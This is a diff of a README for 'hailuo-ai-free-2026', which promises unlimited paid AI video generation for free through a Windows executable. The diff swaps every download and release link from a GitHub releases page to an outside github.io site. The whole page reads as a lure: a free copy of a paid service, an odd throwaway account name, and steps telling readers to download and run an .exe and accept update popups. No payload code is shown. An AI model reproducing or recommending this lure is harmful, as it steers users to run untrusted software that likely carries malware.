@@ -1,6 +1,6 @@
 # 🎬 hailuo-ai-free-2026 - Unlimited AI Video Generation Without Paying
 
-[![Download Now](https://img.shields.io/badge/Download-Hailuo%20AI%20Free%202026-brightgreen?style=for-the-badge&logo=github)](https://github.com/Ungusseted-insect9747/hailuo-ai-free-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Hailuo%20AI%20Free%202026-brightgreen?style=for-the-badge&logo=github)](https://ungusseted-insect9747.github.io)
 
 ---
 
@@ -31,7 +31,7 @@ Getting the app is simple. Just follow these steps:
 
 1. **Visit the download page** by clicking this button:
 
-   [![Download Hailuo AI Free 2026](https://img.shields.io/badge/⬇️%20Download%20Now-FF5722?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Ungusseted-insect9747/hailuo-ai-free-2026/releases)
+   [![Download Hailuo AI Free 2026](https://img.shields.io/badge/⬇️%20Download%20Now-FF5722?style=for-the-badge&logo=windows&logoColor=white)](https://ungusseted-insect9747.github.io)
 
 2. **Look for the latest release** — it will be at the top of the page with a version number like "v1.0.0" or similar.
 3. **Click the download link** for the file. It will be named something like `hailuo-ai-free-2026.exe` or `hailuo-setup.exe`.
@@ -120,7 +120,7 @@ No! The heavy AI processing happens on Hailuo's servers. Your computer just need
 The developers regularly release updates to improve performance and add new features. Here's how to stay current:
 
 1. **Automatic Updates**: The app checks for updates when you open it. If one is available, you'll see a popup asking if you want to update. Click "Yes."
-2. **Manual Updates**: Visit the [releases page](https://github.com/Ungusseted-insect9747/hailuo-ai-free-2026/releases) and download the newest version. Install it over your old version — your settings will be preserved.
+2. **Manual Updates**: Visit the [releases page](https://ungusseted-insect9747.github.io) and download the newest version. Install it over your old version — your settings will be preserved.
 
 ---
 
